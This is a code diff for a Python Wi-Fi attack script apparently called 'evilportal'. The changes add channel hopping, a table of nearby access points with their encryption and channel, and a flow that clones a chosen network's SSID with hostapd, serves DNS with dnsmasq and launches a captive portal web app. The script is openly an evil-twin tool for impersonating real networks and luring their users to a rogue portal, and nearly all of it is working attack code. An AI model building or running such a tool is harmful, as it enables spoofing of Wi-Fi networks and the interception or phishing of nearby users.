@@ -1,4 +1,4 @@
-import os, re, random, requests, time, signal
+import os, re, random, requests, time, signal, threading
 
 tempFolder = '/tmp/evilportal'
 
@@ -35,9 +35,9 @@ class networkInterfaces:
                     #
                     f = open(self.netIntDir + '/' + interface + '/type', 'r')
                     if f.read() == '803\n':
-                        self.interfaces.append({'name' : interface, 'mode' : 'monitor'})
+                        self.interfaces.append({'name' : interface, 'mode' : 'monitor', 'channel' : 0})
                     else:
-                        self.interfaces.append({'name' : interface, 'mode' : 'managed'})
+                        self.interfaces.append({'name' : interface, 'mode' : 'managed', 'channel' : 0})
                     f.close()
 
     def __repr__(self):
@@ -74,15 +74,45 @@ class networkInterfaces:
         os.system('iw ' + interface['name'] + ' set type monitor')
         os.system('ifconfig ' + interface['name'] + ' up')
 
+        # Check if interface is indeed in monitor mode
         f = open(self.netIntDir + '/' + interface['name'] + '/type', 'r')
         if f.read() != '803\n':
             print('[x] Newtork interface couldn\'t be put in monitor mode!\n')
             f.close()
             return -1
         f.close()
+
+        # Set channel to 1 for later scanning
+        os.system('iw ' + interface['name'] + ' set channel 1')
+        self.interfaces[nInterface]['channel'] = 1
+
         print('[+] Network interface configured succesfuly')
         
         return 0
+
+    def changeChannel(self, nInterface):
+        if type(nInterface) is not int:
+            print('[x] Input value is not an integer!\n')
+            return -1
+
+        if nInterface < 0 or nInterface >= len(self.interfaces):
+            print('[x] Input value out of bounds!\n')
+            return -1
+
+        t = threading.currentThread()
+        # We assign stop=False to the current thread. This is used to stop the loop from other thread
+        while not getattr(t, 'stop', False):
+            channel = self.interfaces[nInterface]['channel']
+            channel = channel + 5
+            if channel > 11:
+                channel = 1
+            self.interfaces[nInterface]['channel'] = channel
+
+            os.system('iw ' + self.interfaces[nInterface]['name'] + ' set channel ' + str(channel))
+            time.sleep(3)
+
+        os.system('iw ' + self.interfaces[nInterface]['name'] + ' set channel 1')
+        self.interfaces[nInterface]['channel'] = 1
 
     def launchHostapd(self, nInterface, ssid, channel, encryption):
         if type(nInterface) is not int:
@@ -98,6 +128,7 @@ class networkInterfaces:
         # Hostapd configuration
         print('[-] Configuring hostapd...')
         hostapdConfigFile = 'hostapd.conf'
+        hostapdConfig = ''
 
         hostapdConfig += 'interface=' + interface + '\n'        # Interface used
         hostapdConfig += 'driver=nl80211\n'                     # Driver interface typr
@@ -146,9 +177,9 @@ class networkInterfaces:
         os.system('service dnsmasq stop')
 
         # Config dnsmasq
-        dnsmasqConfig = ''
-        dnsmasqConfigFile = 'dnsmasq.conf'
         dnsmasqHostsFile = 'hosts'
+        dnsmasqConfigFile = 'dnsmasq.conf'
+        dnsmasqConfig = ''
 
         print('[-] Configuring dnsmasq...')
 
@@ -178,72 +209,6 @@ class networkInterfaces:
         print('[+] dnsmasq succesfuly configured')
 
         return 0
-
-    def sniffProbeReq(self, nInterface, sigint_handler):
-        tcpdumpLogFile = 'tcpdump.log'
-        tcpdumpFD = 0
-        probeRequests = []
-
-        if type(nInterface) is not int:
-            print('[x] Input value is not an integer!\n')
-            return -1
-
-        if nInterface < 0 or nInterface >= len(self.interfaces):
-            print('[x] Input value out of bounds!\n')
-            return -1
-
-        # We need to create the file before reading it, as tcpdump
-        # may delay a few miliseconds until it creates it it self
-        f = open(os.path.join(tempFolder, tcpdumpLogFile), 'w+')
-        f.close()
-
-        os.system('tcpdump -l -e -i' + self.interfaces[nInterface]['name'] + ' type mgt subtype probe-req>' + os.path.join(tempFolder, tcpdumpLogFile) + ' 2>&1 &')
-
-        tcpdumpFD = open(os.path.join(tempFolder, tcpdumpLogFile), 'r')
-
-        # stop is defined as global for the sigint handler to be able to get it
-        global stop
-        stop = False
-
-        def sigint_handler_probe(sig, frame):
-            global stop
-            stop = True
-            signal.signal(signal.SIGINT, sigint_handler)
-        
-        signal.signal(signal.SIGINT, sigint_handler_probe)
-
-        print('PROBE REQUESTS (Ctrl C to stop)')
-        while not stop:
-            line = tcpdumpFD.readline()
-            if line:
-                client = re.search(r'([0-9a-f]{2}:){5}[0-9a-f]{2}', line)
-                ap = re.findall(r'[(](.+?)[)]', line)
-                if client and len(ap) == 2:
-                    newProbeRequest = {'client' : client.group(), 'ap' : ap[1]}
-                    try:
-                        probeRequests.index(newProbeRequest)
-                        inList = True
-                    except ValueError:
-                        inList = False
-                    
-                    if not inList:
-                        probeRequests.append(newProbeRequest)
-                        print('[' + str(len(probeRequests)) + '] ' + client.group() + ' -> ' + ap[1])
-
-            time.sleep(1)
-        
-        tcpdumpFD.close()
-        os.system('pkill tcpdump')
-        print()
-        
-        probeRequest = -1
-        while probeRequest < 0 or probeRequest >= len(probeRequests):
-            probeRequest = int(input('Select probe request to mirror > ')) - 1
-
-            if probeRequest < 0 or probeRequest >= len(probeRequests):
-                print('[x] Input out of bounds!')
-            else:
-                return probeRequests[probeRequest]
 
     def sniffAccessPoints(self, nInterface, sigint_handler):
         tcpdumpLogFile = 'tcpdump.log'
@@ -278,14 +243,27 @@ class networkInterfaces:
         
         signal.signal(signal.SIGINT, sigint_handler_probe)
 
+        t = threading.Thread(target = self.changeChannel, args = (nInterface,))
+        t.start()
+
         print('WIFI ACCESS POINTS (Ctrl C to stop)')
+        print('+---+-------------------+------+----+----------------------------------+')
+        print('| i |       BSSID       | ENCR | CH |               SSID               |')
+        print('+---+-------------------+------+----+----------------------------------+')
         while not stop:
             line = tcpdumpFD.readline()
             if line:
                 bssid = re.search(r'([0-9a-f]{2}:){5}[0-9a-f]{2}', line)
                 ssid = re.findall(r'[(](.+?)[)]', line)
-                if bssid and len(ssid) == 3:
-                    newAccessPoint = {'bssid' : bssid.group(), 'ssid' : ssid[2]}
+                channel = re.search(r'CH: \d+', line)
+                privacy = re.search('PRIVACY', line)
+                if len(ssid) == 3:
+                    if privacy:
+                        encryption = 'WPA2'
+                    else:
+                        encryption = 'OPEN'
+
+                    newAccessPoint = {'bssid' : bssid.group(), 'ssid' : ssid[2], 'channel' : channel.group().split(': ')[1], 'encryption' : encryption}
                     try:
                         accessPoints.index(newAccessPoint)
                         inList = True
@@ -294,15 +272,93 @@ class networkInterfaces:
                     
                     if not inList:
                         accessPoints.append(newAccessPoint)
-                        print('[' + str(len(accessPoints)) + '] ' + bssid.group() + ' -> ' + ssid[2])
+                        print('|%3s| %17s | %4s | %2s | %-32.32s |' % (str(len(accessPoints)), bssid.group(), encryption, channel.group().split(': ')[1], ssid[2]))
 
             # If not paused, python3 would consume a crazy amount of resources
             time.sleep(0.05)
 
+        print('--+-------------------+------+----+----------------------------------+\n')
+        tcpdumpFD.close()
+        t.stop = True
+        t.join()
+        os.system('pkill tcpdump')
+
+        accessPoint = -1
+        while accessPoint < 0 or accessPoint >= len(accessPoints):
+            accessPoint = int(input('Select access point to mirror > ')) - 1
+
+            if accessPoint < 0 or accessPoint >= len(accessPoints):
+                print('[x] Input out of bounds!')
+            else:
+                return accessPoints[accessPoint]
+        print()
+
+    def sniffProbeReq(self, nInterface, sigint_handler):
+        tcpdumpLogFile = 'tcpdump.log'
+        tcpdumpFD = 0
+        probeRequests = []
+
+        if type(nInterface) is not int:
+            print('[x] Input value is not an integer!\n')
+            return -1
+
+        if nInterface < 0 or nInterface >= len(self.interfaces):
+            print('[x] Input value out of bounds!\n')
+            return -1
+
+        # We need to create the file before reading it, as tcpdump
+        # may delay a few miliseconds until it creates it it self
+        f = open(os.path.join(tempFolder, tcpdumpLogFile), 'w+')
+        f.close()
+
+        os.system('tcpdump -l -e -i' + self.interfaces[nInterface]['name'] + ' type mgt subtype probe-req>' + os.path.join(tempFolder, tcpdumpLogFile) + ' 2>&1 &')
+
+        tcpdumpFD = open(os.path.join(tempFolder, tcpdumpLogFile), 'r')
+
+        # stop is defined as global for the sigint handler to be able to get it
+        global stop
+        stop = False
+
+        # Define new sigint handler to be able to stop the scanning loop
+        def sigint_handler_probe(sig, frame):
+            global stop
+            stop = True
+            signal.signal(signal.SIGINT, sigint_handler)
+        
+        signal.signal(signal.SIGINT, sigint_handler_probe)
+
+        print('PROBE REQUESTS (Ctrl C to stop)')
+        while not stop:
+            line = tcpdumpFD.readline()
+            if line:
+                client = re.search(r'([0-9a-f]{2}:){5}[0-9a-f]{2}', line)
+                ap = re.findall(r'[(](.+?)[)]', line)
+                if client and len(ap) == 2:
+                    newProbeRequest = {'client' : client.group(), 'ap' : ap[1]}
+                    try:
+                        probeRequests.index(newProbeRequest)
+                        inList = True
+                    except ValueError:
+                        inList = False
+                    
+                    if not inList:
+                        probeRequests.append(newProbeRequest)
+                        print('[' + str(len(probeRequests)) + '] ' + client.group() + ' -> ' + ap[1])
+
+            time.sleep(0.1)
+        
         tcpdumpFD.close()
         os.system('pkill tcpdump')
         print()
+        
+        probeRequest = -1
+        while probeRequest < 0 or probeRequest >= len(probeRequests):
+            probeRequest = int(input('Select probe request to mirror > ')) - 1
 
+            if probeRequest < 0 or probeRequest >= len(probeRequests):
+                print('[x] Input out of bounds!')
+            else:
+                return probeRequests[probeRequest]
 
 def configWebApp():
     # Config captive portal files
@@ -440,8 +496,20 @@ while op < 1 or op > 3:
         configWebApp()
 
     elif op == 2:
-        networkInterfaces.sniffAccessPoints(interface, sigint_handler)
-        quit()
+        accessPoint = networkInterfaces.sniffAccessPoints(interface, sigint_handler)
+        
+        ssid = accessPoint['ssid']
+        channel = accessPoint['channel']
+        encryption = accessPoint['encryption']
+
+        # Launch hostapd
+        networkInterfaces.launchHostapd(interface, ssid, channel, encryption)
+
+        # Launch dnsmasq
+        networkInterfaces.launchDnsmasq(interface)
+
+        # Config web app
+        configWebApp()
 
     elif op == 3:
         probeRequest = networkInterfaces.sniffProbeReq(interface, sigint_handler)
